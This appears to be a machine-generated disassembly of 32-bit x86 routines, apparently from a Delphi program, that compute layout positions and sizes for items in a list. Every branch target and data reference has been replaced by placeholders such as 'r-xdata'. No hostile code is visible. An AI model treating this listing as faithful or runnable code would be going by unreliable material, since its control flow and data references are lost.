test esi esi
jne r-xdata
push ebp
mov ecx [ ebx + 0x44 ]
lea edx [ ebx + 0x39 ]
mov eax ebx
call sub_42fdd8
pop ecx
test al al
jne r-xdata
mov eax [ ebx + 0x39 ]
add eax [ ebx + 0x44 ]
sub eax [ ebp - 0x1c ]
sub [ ebx + 0x39 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
cmp eax [ ebx + 0x39 ]
jle r-xdata
mov eax esi
mov edx [ ebx + 0x39 ]
mov [ eax + 0x39 ] edx
mov edx [ ebx + 0x3d ]
mov [ eax + 0x3d ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x3d ] edx
mov esi [ eax + 0x34 ]
test esi esi
jne r-xdata
mov eax [ ebp - 0x3c ]
sub eax [ ebp - 0x20 ]
add [ ebp - 0x24 ] eax
add eax [ ebp - 0x40 ]
add [ ebp - 0x20 ] eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x24 ]
add eax [ ebp - 0x38 ]
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x64 ]
sub [ ebp - 0x24 ] eax
mov eax [ ebp - 0x64 ]
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x39 ]
mov edx [ ebp - 0x80 ]
add eax [ edx + 0x44 ]
cmp eax [ ebp - 0x5c ]
jle r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
jmp r-xdata
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax ]
mov [ ebx + 0x39 ] eax
push ebp
lea edx [ ebp - 0x3c ]
mov ecx [ ebp - 0x40 ]
mov eax ebx
call sub_42fdd8
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x3c ]
mov [ ebx + 0x39 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebx + 0x3d ] eax
mov eax [ ebp - 0x40 ]
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x39 ]
mov edx [ ebp - 0x80 ]
add eax [ edx + 0x44 ]
sub eax [ ebp - 0x5c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
dec eax
cmp edi eax
jge r-xdata
dec edi
inc [ ebp - 0x7c ]
jne r-xdata
mov eax esi
mov edx [ ebx + 0x16 ]
mov [ eax + 0x16 ] edx
mov edx [ ebx + 0x1a ]
mov [ eax + 0x1a ] edx
mov edx [ ebx + 0x39 ]
mov [ eax + 0x39 ] edx
mov edx [ ebx + 0x3d ]
mov [ eax + 0x3d ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x3d ] edx
mov edx [ ebx + 0x44 ]
mov [ eax + 0x44 ] edx
mov esi [ eax + 0x34 ]
test esi esi
jne r-xdata
cmp [ ebx + 0x15 ] 0x0
jne r-xdata
mov esi [ ebx + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x60 ]
jle r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x39 ]
mov edx [ ebp - 0x80 ]
add eax [ edx + 0x44 ]
mov edx [ ebp - 0x64 ]
sub edx eax
sub [ ebp - 0x60 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_4143bc
mov [ ebp - 0x80 ] eax
mov eax [ ebp - 0x8 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x39 ]
cmp eax [ ebp - 0x3c ]
jge r-xdata
mov eax esi
mov edx [ ebx + 0x16 ]
mov [ eax + 0x16 ] edx
mov edx [ ebx + 0x1a ]
mov [ eax + 0x1a ] edx
mov edx [ ebx + 0x39 ]
mov [ eax + 0x39 ] edx
mov edx [ ebx + 0x3d ]
mov [ eax + 0x3d ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x1a ] edx
mov edx [ eax + 0x30 ]
mov edx [ edx + 0x24 ]
add [ eax + 0x3d ] edx
mov edx [ ebx + 0x20 ]
mov [ eax + 0x20 ] edx
mov edx [ ebx + 0x44 ]
mov [ eax + 0x44 ] edx
mov esi [ eax + 0x34 ]
test esi esi
jne r-xdata
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x39 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x80 ]
mov edx [ ebp - 0x18 ]
sub [ eax + 0x39 ] edx
mov eax [ ebp - 0x80 ]
mov eax [ eax + 0x44 ]
sub [ ebp - 0x5c ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_4143bc
mov esi eax
push ebp
mov ecx [ esi + 0x44 ]
lea edx [ esi + 0x39 ]
mov eax esi
call sub_42fdd8
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x60 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x3c ]
mov [ ebx + 0x39 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebx + 0x3d ] eax
mov eax [ ebp - 0x40 ]
mov [ ebx + 0x44 ] eax
mov eax [ ebp - 0x80 ]
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_4143bc
mov edx [ eax + 0x16 ]
mov [ esi + 0x16 ] edx
mov edx [ eax + 0x1a ]
mov [ esi + 0x1a ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_4143bc
mov edx [ eax + 0x39 ]
mov [ esi + 0x39 ] edx
mov edx [ eax + 0x3d ]
mov [ esi + 0x3d ] edx
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x24 ]
add [ esi + 0x1a ] eax
mov eax [ esi + 0x30 ]
mov eax [ eax + 0x24 ]
add [ esi + 0x3d ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_4143bc
mov eax [ eax + 0x20 ]
mov [ esi + 0x20 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x228 ]
mov edx edi
call sub_4143bc
mov eax [ eax + 0x44 ]
mov [ esi + 0x44 ] eax
mov esi [ esi + 0x34 ]
test esi esi
jne r-xdata
sub_430954
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_414210
inc edi
xor esi esi
mov ecx ebx
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_414438
jmp r-xdata
mov edx [ ebx + 0x44 ]
cmp edx [ eax + 0x44 ]
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
dec edi
jne r-xdata
mov edx [ ebx + 0x40 ]
cmp edx [ eax + 0x40 ]
jge r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4143bc
mov edx [ ebx + 0x44 ]
cmp edx [ eax + 0x44 ]
jl r-xdata
sub_4309b4
push ebp
mov ebp esp
add esp 0xffffffa4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov [ ebp - 0x5 ] 0x0
mov [ ebp - 0x35 ] 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x20 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x2c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov [ ebp - 0x34 ] eax
xor edx edx
push ebp
push sub_430d61
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax ebx
call sub_445ab4
mov edx eax
mov eax [ ebp - 0x20 ]
call sub_414520
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x21 ] 0x0
mov eax ebx
call sub_445ab4
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0xc ] 0x0
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
inc eax
mov [ ebp - 0x3c ] eax
mov [ ebp - 0xc ] 0x0
mov al 0x1
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x34 ]
push eax
push 0x0
mov al [ ebp - 0x35 ]
push eax
push rw-data
push 0xffffffff
push 0xffffffff
push 0x1
lea ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4310f0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4143bc
lea edx [ ebp - 0x5c ]
call sub_441ef0
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x34 ]
push eax
push 0x0
mov al [ ebp - 0x35 ]
push eax
push rw-data
push 0xffffffff
push 0xffffffff
push 0x0
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_4143bc
mov edx eax
lea ecx [ ebp - 0x5c ]
mov eax ebx
call sub_4310f0
inc [ ebp - 0xc ]
dec [ ebp - 0x3c ]
jne r-xdata
test [ ebx + 0x1c ] 0x10
setne al
and al [ ebp - 0x19 ]
je r-xdata
inc edi
xor esi esi
xor eax eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_430d68
mov eax [ ebp - 0x20 ]
call sub_403344
mov eax [ ebp - 0x2c ]
call sub_403344
mov eax [ ebp - 0x30 ]
call sub_403344
mov eax [ ebp - 0x34 ]
call sub_403344
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebp - 0x19 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
inc esi
dec edi
jne r-xdata
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_4143bc
mov eax [ eax ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov [ ebp - 0x22 ] al
mov [ ebp - 0x19 ] 0x0
mov eax [ ebx + 0x228 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
cmp [ ebp - 0x19 ] 0x0
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov [ ebp - 0x19 ] 0x0
mov edi [ ebx + 0x228 ]
mov eax edi
mov edx esi
call sub_4143bc
mov edx eax
mov eax edi
call sub_42fc44
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_4143bc
cmp [ eax + 0x30 ] 0x0
jne r-xdata
cmp [ ebp - 0x21 ] 0x0
jne r-xdata
inc [ ebp - 0xc ]
dec [ ebp - 0x3c ]
jne r-xdata
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov [ ebp - 0x10 ] esi
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_4143bc
mov [ ebp - 0x28 ] eax
mov edi [ ebp - 0x28 ]
mov edx [ edi + 0x8 ]
add edx [ edi + 0x10 ]
mov eax [ ebp - 0x34 ]
call sub_414210
cmp [ ebx + 0x218 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_4143bc
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_445a78
mov [ ebp - 0x18 ] eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
call sub_430954
mov [ ebp - 0x5 ] 0x1
lea edx [ ebp - 0x4c ]
mov eax [ edi ]
call sub_441ef0
mov eax [ edi + 0x1a ]
add eax [ edi + 0x8 ]
mov edx [ edi ]
add eax [ edx + 0x4c ]
push eax
lea eax [ ebp - 0x4c ]
push eax
mov ecx [ edi + 0x16 ]
add ecx [ edi + 0x20 ]
sub ecx [ edi + 0xc ]
mov eax [ edi + 0x1a ]
add eax [ edi + 0x8 ]
push eax
mov eax [ edi + 0x16 ]
add eax [ edi + 0x4 ]
pop edx
call sub_412f04
jmp r-xdata
xor eax eax
jmp r-xdata
xor edx edx
mov dl [ ebp - 0x11 ]
mov eax [ ebp - 0x2c ]
call sub_414210
mov edx esi
mov eax [ ebp - 0x30 ]
call sub_414210
mov eax [ ebp - 0x28 ]
mov edi [ eax + 0x34 ]
test edi edi
je r-xdata
lea eax [ esi + 0x1 ]
mov edx [ ebx + 0x228 ]
cmp eax [ edx + 0x8 ]
jge r-xdata
mov al [ edi + 0x15 ]
mov [ ebp - 0x11 ] al
cmp [ ebp - 0x11 ] 0x0
je r-xdata
cmp al [ ebp - 0x22 ]
setne [ ebp - 0x21 ]
mov eax [ ebx + 0x228 ]
mov edx esi
call sub_4143bc
mov dl [ ebp - 0x22 ]
mov [ eax + 0x14 ] dl
mov [ ebp - 0x19 ] 0x1
jmp r-xdata
mov eax [ ebx + 0x228 ]
mov edx [ ebp - 0x28 ]
call sub_42fc44
jmp r-xdata
mov eax [ ebx + 0x228 ]
mov edx edi
call sub_414418
mov esi eax
xor edx edx
mov dl [ edi + 0x15 ]
mov eax [ ebp - 0x2c ]
call sub_414210
mov edx esi
mov eax [ ebp - 0x30 ]
call sub_414210
mov eax edi
mov edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
mov eax [ ebp - 0x34 ]
call sub_414210
cmp [ edi + 0x15 ] 0x0
je r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x228 ]
call sub_4143bc
mov edi eax
cmp [ edi + 0x15 ] 0x0
jne r-xdata
mov edi [ edi + 0x34 ]
test edi edi
jne r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebx + 0x228 ]
cmp edx [ eax + 0x8 ]
jge r-xdata
mov [ edi + 0x15 ] 0x1
mov [ edi + 0x38 ] 0x1
mov [ ebp - 0x35 ] 0x1
lea edx [ esi + 0x1 ]
call sub_4143bc
cmp [ eax + 0x15 ] 0x0
jne r-xdata
mov [ eax + 0x15 ] 0x1
sub_430d98
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov ebp eax
mov eax [ ebp + 0x228 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov eax [ ebp + 0x228 ]
mov edx esi
call sub_4143bc
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x228 ]
mov edx esi
call sub_4143bc
test eax eax
je r-xdata
lea edx [ esp + 0x8 ]
mov eax [ ebx ]
call sub_441ef0
mov eax [ esp + 0x8 ]
mov [ ebx + 0x16 ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1a ] eax
mov eax [ ebx + 0x4 ]
sub [ ebx + 0x16 ] eax
mov eax [ ebx + 0x8 ]
sub [ ebx + 0x1a ] eax
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x1a ]
mov eax [ ebx + 0x30 ]
add edx [ eax + 0x24 ]
mov ecx esp
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x16 ]
call sub_412edc
mov eax [ esp ]
mov [ ebx + 0x16 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1a ] eax
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x48 ]
add eax [ ebx + 0x4 ]
add eax [ ebx + 0xc ]
mov [ ebx + 0x20 ] eax
mov al [ ebx + 0x38 ]
mov [ ebx + 0x15 ] al
sub_430e50
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp ] ecx
mov ebp edx
mov ebx eax
mov [ esp + 0x4 ] 0x1
mov eax ebx
call sub_449088
test al al
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
je r-xdata
mov al [ ebx + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax ebx
call sub_445ab4
test eax eax
jle r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ ebx + 0x228 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
mov [ ebp ] eax
mov eax [ ebx + 0x228 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax ebx
call sub_441f98
mov edx [ ebx + 0x4c ]
sub edx eax
mov eax [ esp ]
add [ eax ] edx
inc esi
xor edi edi
mov eax ebx
call sub_441f54
mov edx [ ebx + 0x48 ]
sub edx eax
add [ ebp ] edx
jmp r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
inc edi
dec esi
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx edi
mov eax [ ebx + 0x228 ]
call sub_4143bc
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx [ eax + 0x3d ]
mov ecx [ eax ]
add edx [ ecx + 0x4c ]
add edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
mov ecx [ esp ]
cmp edx [ ecx ]
jle r-xdata
mov edx [ eax ]
cmp [ edx + 0x57 ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x228 ]
call sub_4143bc
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov edx [ eax ]
mov edx [ edx + 0x48 ]
add edx [ eax + 0x39 ]
add edx [ eax + 0x4 ]
add edx [ eax + 0xc ]
cmp edx [ ebp ]
jle r-xdata
mov edx [ eax ]
cmp [ edx + 0x57 ] 0x0
je r-xdata
mov eax [ esp ]
mov [ eax ] edx
mov edx [ eax ]
mov edx [ edx + 0x48 ]
add edx [ eax + 0x39 ]
add edx [ eax + 0x4 ]
add edx [ eax + 0xc ]
mov [ ebp ] edx
sub_430f74
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x5 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x10 ]
mov edx [ edx + 0x228 ]
cmp eax [ edx + 0x8 ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x15 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x1d ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x230 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x228 ]
call sub_4143bc
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x11 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x228 ]
mov ecx ebx
call sub_414438
mov eax [ ebp + 0x8 ]
cmp [ eax + 0xc ] 0x1
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov [ eax + 0x34 ] ebx
mov edx [ ebp + 0x8 ]
add edx 0xffffffdf
push edx
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x19 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x21 ]
push edx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffc7
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0x29 ]
mov eax [ ebp + 0x8 ]
mov dl [ eax - 0x5 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42fbc4
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
cmp [ ebx + 0x15 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
dec [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x230 ]
mov edx [ ebp + 0x8 ]
add [ edx - 0x1d ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x28 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x20 ]
push eax
push ebx
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffc7
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x21 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_4310f0
mov [ ebx + 0x15 ] 0x0
mov [ ebx + 0x38 ] 0x0
sub_4310f0
push ebp
mov ebp esp
add esp 0xffffff9c
push ebx
push esi
push edi
mov esi [ ebp + 0x14 ]
lea edi [ ebp - 0x39 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x28 ] edx
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x28 ]
mov [ eax + 0x214 ] edx
mov eax [ ebp + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov [ ebp - 0x4d ] 0x0
xor edx edx
mov eax [ ebp + 0x28 ]
call sub_4143bc
mov [ ebp - 0x4d ] al
xor edx edx
mov eax [ ebp + 0x28 ]
call sub_41425c
jmp r-xdata
mov [ ebp - 0xc ] 0xffffffff
xor edx edx
mov eax [ ebp + 0x24 ]
call sub_4143bc
mov [ ebp - 0xc ] eax
xor edx edx
mov eax [ ebp + 0x24 ]
call sub_41425c
jmp r-xdata
mov eax [ ebp + 0x24 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
or ebx 0xffffffff
xor edx edx
mov eax [ ebp + 0x20 ]
call sub_4143bc
mov ebx eax
xor edx edx
mov eax [ ebp + 0x20 ]
call sub_41425c
jmp r-xdata
mov eax [ ebp + 0x20 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
mov [ ebp + 0x10 ] eax
mov esi rw-data
lea edi [ ebp - 0x39 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
test ebx ebx
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x40 ] 0x80000001
mov [ ebp - 0x44 ] 0x80000001
push esi
lea edi [ ebp - 0x21 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov al 0x1
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
add ebx [ ebp - 0x15 ]
sub ebx [ ebp - 0x1d ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov ebx [ ebp - 0x35 ]
add ebx [ ebp - 0x2d ]
push ebp
call sub_430f74
pop ecx
inc eax
mov [ ebp - 0x54 ] eax
xor esi esi
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] 0x1
mov eax [ ebp - 0x10 ]
push [ eax + 0x230 ]
mov eax ebx
pop edx
mov ecx edx
cdq
idiv ecx
mov [ ebp + 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp eax [ ebp - 0x44 ]
jle r-xdata
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x29 ] al
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
shr eax 0x1
add eax [ ebp - 0x1d ]
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x5 ] 0x0
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + 0x234 ]
and al [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0xc ] 0x1
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ebp + 0xc ]
mov eax [ ebp - 0x21 ]
cmp eax [ ebp - 0x64 ]
jle r-xdata
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x21 ]
add eax [ ebp + 0x10 ]
mov [ ebp - 0x19 ] eax
lea edx [ ebp - 0x39 ]
lea eax [ ebp - 0x21 ]
call sub_42fc6c
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
imul [ ebp + 0xc ]
cmp ebx eax
jle r-xdata
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x39 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
imul [ ebp + 0xc ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
cmp esi eax
je r-xdata
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x60 ]
jle r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
imul [ ebp + 0xc ]
add eax [ ebp - 0x1d ]
mov [ ebp - 0x15 ] eax
mov eax [ ebp - 0x10 ]
push [ eax + 0x230 ]
mov eax ebx
pop edx
mov ecx edx
cdq
idiv ecx
inc eax
mov [ ebp + 0xc ] eax
inc [ ebp + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x44 ]
jge r-xdata
lea eax [ esi + 0x1 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
mov [ ebp - 0x5 ] 0x0
lea eax [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x64 ]
cmp eax [ ebp - 0x21 ]
jg r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x228 ]
call sub_4143bc
cmp [ eax + 0x15 ] 0x0
je r-xdata
cmp [ ebp - 0x4d ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebx + 0x34 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x60 ]
jl r-xdata
inc esi
dec [ ebp - 0x54 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0x40 ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x11 ] al
push ebp
call sub_430f74
pop ecx
jmp r-xdata
mov al 0x1
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x228 ]
mov edx esi
call sub_4143bc
mov ebx eax
mov eax [ ebx + 0x1a ]
add eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0x64 ]
push eax
mov edi [ ebx + 0x16 ]
mov ecx edi
add ecx [ ebx + 0x20 ]
mov edx [ ebx + 0x1a ]
mov eax edi
call sub_412f04
mov eax [ ebp - 0x58 ]
mov edx eax
sub edx [ ebp - 0x60 ]
cmp edx [ ebp - 0x40 ]
jle r-xdata
mov [ ebp - 0x5 ] al
lea eax [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_431410
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov [ ebx + 0x214 ] eax
mov eax [ ebx + 0x228 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
